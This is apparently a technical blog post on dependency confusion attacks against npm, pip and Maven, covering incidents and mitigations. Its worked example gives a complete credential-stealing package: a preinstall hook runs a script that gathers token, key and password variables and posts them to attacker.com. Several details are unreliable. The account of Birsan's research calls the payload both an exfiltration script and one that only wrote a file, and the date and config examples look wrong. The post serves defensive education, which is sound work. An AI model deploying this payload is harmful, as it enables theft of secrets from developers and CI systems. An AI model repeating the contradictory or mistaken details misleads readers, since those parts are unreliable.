<!-- tags: security-research, supply-chain, package-management -->
<!-- date: 2025-09-08 -->
# The Package That Wasn't: How Dependency Confusion Exploits Break Supply Chain Trust

*A technical deep-dive on dependency confusion attacks for engineers, DevOps practitioners, and anyone shipping software that depends on external packages. The attack works against private package management, the version selection algorithms of npm, pip, and Maven, and the assumption that package names map to trusted authors.*

---

## The Thesis

Package managers are designed to resolve names to packages, not to verify that a package name belongs to who you think it does. When you run `npm install left-pad`, the system assumes "left-pad" on the public registry is the real left-pad and not a malicious package uploaded 10 seconds ago. Dependency confusion exploits this by publishing a package to the public registry with the same name as a company's internal/private package. The package manager sees two candidates and picks the public one — often because it has a higher version number or because the private registry isn't configured correctly. The attacker's code runs during installation with full access to the environment.

This is not a bug in a specific package manager. It's a flaw in the trust model that all package managers share: names are names, versions are numbers, and higher numbers win.

---

## How Package Resolution Actually Works

Before diving into the attack, you need to understand how package managers choose which package to install when multiple candidates exist.

### npm's Version Resolution Algorithm

When npm sees a dependency like `left-pad@1.0.0`, it:

1. Checks all configured registries in order (private registries first, if configured)
2. Finds all published versions of `left-pad`
3. Resolves `1.0.0` to the latest patch version within that range (e.g., `1.0.5`)
4. Installs from the first registry that has it

**The critical detail:** If you've configured a private registry for scoped packages (`@company/left-pad`), then `left-pad` (unscoped) still resolves against the public registry. If the public registry has `left-pad@999.0.0`, npm will prefer it because version 999 is higher than whatever your internal version is.

### pip's Registry Priority

Python's pip works similarly, but with different complexity:

```bash
pip install left-pad
```

pip checks registries in order (`~/.pyrc`, environment variables, command-line flags). If you've configured a private PyPI server as your primary index, great — unless you use the `--index-url` flag for one package, then accidentally install another without it. Then pip falls back to the public PyPI and installs from there.

### Maven's Repository Resolution

Maven is slightly better because it uses explicit `<repository>` configurations in `pom.xml`:

```xml
<repositories>
  <repository>
    <id>internal-repo</id>
    <url>https://nexus.company.com/repo</url>
  </repository>
  <repository>
    <id>central</id>
    <url>https://repo1.maven.org/maven2</url>
  </repository>
</repositories>
```

But the order matters. If central is listed first, or if your internal artifact doesn't exist in the internal repo for some reason, Maven falls back to central and installs the attacker's version.

**The pattern across all three:** The system is designed to be convenient. It tries hard to find a package. It has fallbacks. And none of those fallbacks include "verify that the publisher is who I think it is."

---

## Alex Birsan's 2021 Research: $130,000 in Bug Bounties

In July 2021, security researcher Alex Birsan published "[Dependency Confusion: When Intentional Defects Meet Unintentional Vulnerabilities](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)." The piece demonstrated that you could exploit the version resolution behavior of npm, pip, and other package managers to execute arbitrary code on machines at major technology companies.

His attack:

1. Identified the internal package names used by Apple, Microsoft, PayPal, and others by examining error logs, source code on GitHub, and job listings
2. Published packages with those same names to npm and PyPI with a benign payload (an exfiltration script)
3. Created higher version numbers to ensure they'd be selected
4. Submitted the findings to each company's bug bounty program

**Result:** The companies confirmed the vulnerability and paid over $130,000 in total bounties. Microsoft, Apple, and PayPal's internal CI/CD systems installed packages they thought were their own private packages. They weren't.

The attack didn't require compromising a private registry. It didn't require stealing credentials. It only required publishing a package with the right name and a high enough version number.

---

## How the Attack Works: A Working Example

Let's walk through a concrete example using npm.

### Step 1: Identify Target Package Names

An attacker researches internal package names. This is easier than you think:

- GitHub repositories with `import` statements: `from mycompany_utils import ...`
- Error messages in GitHub Issues: "ModuleNotFoundError: No module named 'acme-billing'"
- Package.json or requirements.txt files accidentally committed or visible in public logs
- Job postings that mention internal tools: "Experience with our proprietary `@acme/deployment` tool"

Suppose you find that Acme Corp uses an internal npm package called `@acme/utils` but you also discover they sometimes install packages without the `@acme` scope prefix from their older codebase.

### Step 2: Create a Malicious Package

Create a `package.json` for your attack package:

```json
{
  "name": "acme-utils",
  "version": "9999.0.0",
  "description": "Totally legitimate package",
  "scripts": {
    "preinstall": "node exfil.js"
  },
  "main": "index.js"
}
```

The `preinstall` script runs *before* the package is even fully installed. You have access to environment variables, the current directory, and network access.

### Step 3: Write the Payload

Create `exfil.js`:

```javascript
const https = require('https');
const os = require('os');

// Gather sensitive data
const data = {
  env: Object.keys(process.env).filter(k =>
    k.includes('TOKEN') ||
    k.includes('KEY') ||
    k.includes('SECRET') ||
    k.includes('PASSWORD') ||
    k.includes('API')
  ).reduce((acc, k) => {
    acc[k] = process.env[k];
    return acc;
  }, {}),
  user: os.userInfo(),
  cwd: process.cwd(),
  node_version: process.version
};

// Exfiltrate to attacker's server
const payload = JSON.stringify(data);
const req = https.request('https://attacker.com/collect', {
  method: 'POST',
  headers: { 'Content-Length': payload.length }
}, (res) => {
  // Silent success
});
req.write(payload);
req.end();
```

When this runs on a developer's machine or CI system, the attacker gets:
- API tokens and credentials from environment variables
- Build secrets
- Database connection strings
- OAuth tokens
- SSH keys (if `SSH_AUTH_SOCK` is set)

### Step 4: Publish and Wait

```bash
npm publish --registry https://registry.npmjs.org/
```

Now your `acme-utils@9999.0.0` is on npm. When someone installs the unscoped package or when a build system has a misconfigured registry, they get your version.

### Step 5: Real Example — What Happened in Practice

In Birsan's proof-of-concept, he used a benign payload that simply wrote a file. Microsoft's CI system installed it. Apple's CI system installed it. PayPal's CI system installed it.

He never extracted data. He was demonstrating the vulnerability responsibly.

Real attackers would use variants:
- Steal environment variables
- Modify source code in-place before compilation
- Install a persistent backdoor
- Exfiltrate the entire codebase
- Compromise downstream users who install the company's software

---

## The Taxonomy: Dependency Confusion vs. Typosquatting vs. Namespace Confusion

These attacks are often conflated, but they're distinct:

### Typosquatting

**Attack:** Publish a package with a name similar to a popular one. Users make a typo and install the wrong package.

**Example:** `npm install reqeust` (missing 's' in 'request') instead of `npm install request`

**Difficulty:** Low. Requires no special knowledge of internal structure.

**Defense:** Easier to catch. A careful user who checks the package name will notice the typo.

---

### Dependency Confusion (this one)

**Attack:** Publish a package with the exact name of an internal/private package. The package manager resolves to the public version because of version precedence or registry ordering.

**Difficulty:** Medium. Requires knowing internal package names, but those are often discoverable.

**Defense:** Hard. The package name is correct. The version might be higher. The only signal that something is wrong is that you installed from the wrong registry.

---

### Namespace Confusion

**Attack:** In systems with scoped packages, exploit ambiguity between scopes. For example, `npm` allows packages in formats like `@scope/package`. Some systems treat `@scope` as "from this organization" but fail to validate that the organization actually owns the package.

**Example:** Publish `@github/super-popular-tool` when `github` is a common username, not the GitHub organization.

**Difficulty:** Medium-High. Requires understanding the scoping rules of a particular package manager.

**Defense:** Clearer namespace governance, verification that scope matches verified organization.

---

The key difference is that dependency confusion works against the package manager's *intended* behavior. It's not a typo. It's not impersonation. It's exploiting the fact that the system chooses a higher version number, which is the correct default behavior — until it's not.

---

## The npm Install Hook Attack Surface

npm's `preinstall` and `postinstall` scripts execute arbitrary code. This is by design, and it's powerful.

```json
{
  "name": "some-package",
  "scripts": {
    "preinstall": "node install-hook.js",
    "postinstall": "npm run build",
    "prepare": "npm run build"
  }
}
```

All three hooks execute:
- **preinstall:** Before the package is installed. Full environment access, network, filesystem.
- **postinstall:** After the package is installed. Often used for native module compilation (node-gyp). Full access.
- **prepare:** Runs before the package is packed for distribution and after npm install. Also runs when checking out a git dependency.

An attacker can:
1. Read and exfiltrate `package.json` and `package-lock.json` to discover other dependencies
2. Modify source code in the current directory before the build process starts
3. Inject environment variables that will be inherited by child processes
4. Establish a reverse shell for persistent access
5. Modify `/etc/hosts` or DNS to redirect traffic
6. Copy the entire codebase to an attacker-controlled server
7. Wait for a specific condition (e.g., production deploy) before activating

The only defense users have is to run `npm install --ignore-scripts`, but most people don't. Most CI/CD systems don't. And if they did, it would break packages that depend on native modules, which need compilation.

---

## Why Lockfiles Don't Fully Solve It

You might think: "Just use `package-lock.json`! It locks every version!"

That's true, and it's important. But:

### First Install Has No Lockfile

On a fresh checkout or a new development machine:
```bash
git clone https://github.com/acme/project.git
npm install
```

There's no `package-lock.json` yet (or it's being regenerated). npm resolves dependencies fresh. If the registry configuration is wrong or if a private package isn't available, npm falls back to the public registry.

### Lockfiles Can Be Modified

A lockfile is just JSON. If an attacker gains write access to your repository (compromised developer machine, leaked credentials), they can modify `package-lock.json` to point to malicious versions. This is less likely than a dependency confusion attack, but it's possible.

### Transitive Dependencies Aren't Always Locked

If your lockfile is from before a new version of one of your dependencies was released, and that dependency's maintainer publishes a malicious update, there are timing windows where you could get the wrong version.

### Monorepos with Multiple Lockfiles

If your project uses workspaces or monorepos:
```json
{
  "workspaces": ["packages/*"]
}
```

Each workspace might have its own `package-lock.json` or rely on a root-level lockfile. Misconfiguration is common.

---

## Real Incidents

Dependency confusion and related supply chain attacks have happened:

### event-stream (2018)

A widely-used npm package. The maintainer added a new collaborator, who published a malicious version that harvested cryptocurrency wallet credentials from developers using the package.

**Impact:** Thousands of developers.
**Detection:** Manual code review in public repo spotted the unusual code.
**Root cause:** Lax collaborator vetting and assumption that the maintainer was aware of changes.

---

### ua-parser-js (2021)

Popular user-agent parsing library. Compromised account. Malicious versions published that exfiltrated environment variables.

**Impact:** Thousands of applications.
**Detection:** Automated security scanning caught unusual network requests.
**Root cause:** Single developer account with password compromise. No 2FA.

---

### colors.js / faker.js (2022)

A widely-used utility library. The developer intentionally published versions that printed messages and broke applications as a protest over unpaid labor.

**Impact:** Thousands of applications (build failures, not exploitation).
**Detection:** Immediate, because it broke builds loudly.
**Root cause:** Social/labor issue, not technical. But it demonstrated how much power a single account has.

---

### node-ipc (2022)

An npm package used for inter-process communication. Versions published that would detect if the application was running in Russia or Belarus and would corrupt the file system.

**Impact:** Developers worldwide, though the payload was geotargeted.
**Detection:** Community reports, then Google scanning.
**Root cause:** Developer's political statement in response to the Ukraine conflict.

---

These aren't theoretical. They're real. And none of them required a sophisticated exploit. They just required that people trust packages.

---

## Why Defenses Fail

### Blame the Developer

"Just don't install untrusted packages" or "Vet your dependencies."

**Problem:** You can't vet dependencies you don't know you're getting. If you install `left-pad` and left-pad depends on 50 other packages, you're now trusting 50 authors. And those authors might not be aware their accounts have been compromised.

### Use a Private Registry

**Better idea, but:** You still need to configure it correctly. If you misconfigure it, or if you install a package that isn't on the private registry, you fall back to public. And you need to actually publish every internal package to the private registry.

### Use Lockfiles

**Better idea, but:** Only works after the first install. And doesn't help with the first install on a fresh machine or in a fresh environment.

### Use Scoped Packages

**Better idea, but:** You need to use them consistently. If you ever install an unscoped version of a private package, you're vulnerable. And if someone creates a scoped package that looks like yours (`@acme/utils` vs `@acme-utils`), you're back to typosquatting.

### Run npm install --ignore-scripts

**Best idea for security, but:** Breaks anything that needs native module compilation. And most organizations don't do this.

### Scan for Malicious Packages

**Good idea, but:** Scanning tools work based on signatures or heuristics. New malicious packages bypass them. And the payload can be crafted to be dormant until a specific condition (like a production deploy) is met. A scanner running on a pre-commit hook won't see it.

---

## What Actually Works

### 1. Scoped Packages + Registry Configuration

Always use scoped packages for internal code:

```json
{
  "@acme/billing": "^1.0.0",
  "@acme/utils": "^2.3.0"
}
```

Configure your private registry explicitly for those scopes in `.npmrc`:

```
@acme:registry=https://private-npm.company.com/
//private-npm.company.com/:_authToken=${NPM_TOKEN}
registry=https://registry.npmjs.org/
```

This way, `@acme/*` packages come from your private registry, and everything else comes from npm. Clear separation.

**For Python:**

```ini
[distutils]
index-servers =
    internal
    pypi

[internal]
repository: https://private-pypi.company.com/
username: __token__
password: ${PYPI_TOKEN}

[pypi]
repository: https://upload.pypi.org/legacy/
```

### 2. Lockfile Auditing and Integrity Checking

Don't just commit `package-lock.json`. Audit it:

```bash
npm audit
npm audit fix
```

But more importantly, treat lockfile changes as suspicious. If a developer checks in a modified lockfile without corresponding code changes, investigate.

Use tools like [snyk](https://snyk.io/) or [dependabot](https://dependabot.com/) to track known vulnerabilities.

### 3. Package Verification and Signing

Some registries support package signing. npm doesn't do this by default, but you can use tools like `cosign` to sign packages:

```bash
cosign sign-blob --key cosign.key package.tgz > package.tgz.sig
```

Verify on install:

```bash
cosign verify-blob --key cosign.pub --signature package.tgz.sig package.tgz
```

This requires distribution of public keys and verification tooling, but it's strong.

### 4. Sandboxing and Least Privilege in CI/CD

Your CI/CD system (GitHub Actions, GitLab CI, etc.) should run with minimal permissions:
- No access to production credentials
- No access to code signing keys
- Limited network access (if possible)
- Run in a container with a read-only filesystem

If `npm install` does try to exfiltrate data, it can't access production secrets. It can't modify your code. It can only fail.

### 5. Monitor and Alert on Registry Changes

Some organizations monitor their private registry for unexpected packages:

```bash
# Regularly check for new packages published
curl https://private-npm.company.com/api/v1/packages | jq '.packages | keys'
```

If a package appears that wasn't deployed through your normal process, investigate.

### 6. Security-First Dependency Management

- **Know what you depend on.** `npm ls` or `pip freeze` regularly.
- **Remove unused dependencies.** Less surface area.
- **Pin major versions where possible.** `^1.0.0` allows minor/patch updates, which is reasonable. But `*` or no version constraint is asking for trouble.
- **Review dependency updates.** Don't just auto-merge Dependabot PRs. Skim the changelog.

---

## The Pattern

This is the same architectural problem we've seen before.

Dependency confusion, like resume screening AI systems or SSL certificate validation, is a trust model problem. The system assumes:

> "A package name maps to a specific, trustworthy author. Higher version numbers are better. I should install the version that satisfies the constraint."

None of that is wrong individually. But together, they create an attack surface where an attacker can publish a package with the right name and a higher version number, and the system will install it.

The system is correct by its own logic. It's the logic that's flawed.

---

## Conclusion

Package managers work because they optimize for convenience. You can install thousands of dependencies with a single command, and they resolve automatically. That's powerful and it enables the modern software ecosystem.

But that convenience is built on an assumption that never gets explicitly validated: that the person publishing a package named `left-pad` is actually the author of left-pad, or at least someone authorized to publish under that name.

Dependency confusion exposes this assumption. It's not a bug in npm or pip or Maven. It's a feature of the entire package management model.

The mitigations (scoped packages, private registries, lockfiles, signing) work. But they require discipline. They require knowing that the vulnerability exists. And they require that every organization implements them, correctly, consistently.

Until then, every `npm install` is an act of trust. You're trusting:
- The author of the package
- The author's security practices
- The platform (npm, PyPI, Maven Central) to verify identity
- Every maintainer and collaborator who has ever touched the code
- The package manager's resolution algorithm to pick the right one

Any one of those can break. And when it does, your code runs their code.

---

*Last updated: September 2025*

## References

- [Dependency Confusion: When Intentional Defects Meet Unintentional Vulnerabilities — Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [npm Docs: Configuring npm for Multiple Registries](https://docs.npmjs.com/cli/v10/configuring-npm/npmrc)
- [OWASP: Supply Chain Attack](https://owasp.org/www-community/attacks/Supply_chain_attack)
- [Python Packaging: Using Private Package Repositories](https://packaging.python.org/guides/using-testpypi/)
- [Maven Repository Configuration](https://maven.apache.org/guides/introduction/introduction-to-repositories.html)
- [npm Preinstall Hook Security Implications](https://docs.npmjs.com/cli/v10/using-npm/scripts)
- [The State of Software Supply Chain Security — Snyk 2024 Report](https://snyk.io/blog/state-of-software-supply-chain-security/)
- [How event-stream Became a Backdoor — Retrospective](https://github.blog/security/supply-chain-security/preventing-npm-supply-chain-attacks/)
- [ua-parser-js Incident Analysis — npm Security Advisory](https://www.npmjs.com/advisories/1601)
- [node-ipc Malicious Versions — Community Response](https://github.com/RIAEvangelist/node-ipc/issues/305)
- [Cosign: Container Signing, Verification and Storage](https://docs.sigstore.dev/cosign/overview/)
